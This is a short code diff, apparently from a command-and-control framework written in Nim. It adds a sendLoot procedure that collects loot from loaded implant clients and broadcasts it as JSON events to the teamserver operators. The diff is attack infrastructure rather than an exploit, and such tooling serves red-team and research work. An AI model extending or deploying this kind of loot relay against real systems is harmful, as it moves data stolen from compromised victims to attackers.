@@ -1,6 +1,6 @@
 import std/[marshal, json, asyncnet]
 
-import types, utils/jsonConverters
+import types, utils/jsonConverters, loot
 
 proc sendClients*(server: C2Server) =
   for tsClient in server.teamserverClients:
@@ -31,6 +31,19 @@ proc sendTaskUpdate*(server: C2Server, task: Task) =
       discard tsClient.send($(%*{
         "event": "taskupdate",
         "data": taskToJson task
+      }) & "\r\n")
+
+proc sendLoot*(server: C2Server) =
+  for tsClient in server.teamserverClients:
+    if not tsClient.isClosed:
+      var jsonData: JsonNode = %*[]
+      for client in server.clients:
+        if client.loaded:
+          for loot in client.getLoot():
+            jsonData.add lootToJson loot
+      discard tsClient.send($(%*{
+        "event": "loot",
+        "data": jsonData
       }) & "\r\n")
 
 proc sendTaskCreate*(server: C2Server, task: Task) =
